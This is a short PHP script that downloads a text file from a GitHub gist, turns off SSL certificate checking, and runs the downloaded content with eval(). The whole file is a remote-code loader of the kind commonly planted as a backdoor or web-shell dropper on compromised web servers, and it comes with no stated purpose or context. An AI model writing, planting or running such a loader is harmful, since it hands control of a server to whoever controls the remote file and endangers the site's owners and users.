<?php
    $Url = "https://gist.githubusercontent.com/alternation1337/ae4508f31c1dba1504fc17821212fc9c/raw/24df01e22525f220e6c9d1b19d66ea812ef35833/3.txt";
    $ch = curl_init($Url);
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);
?>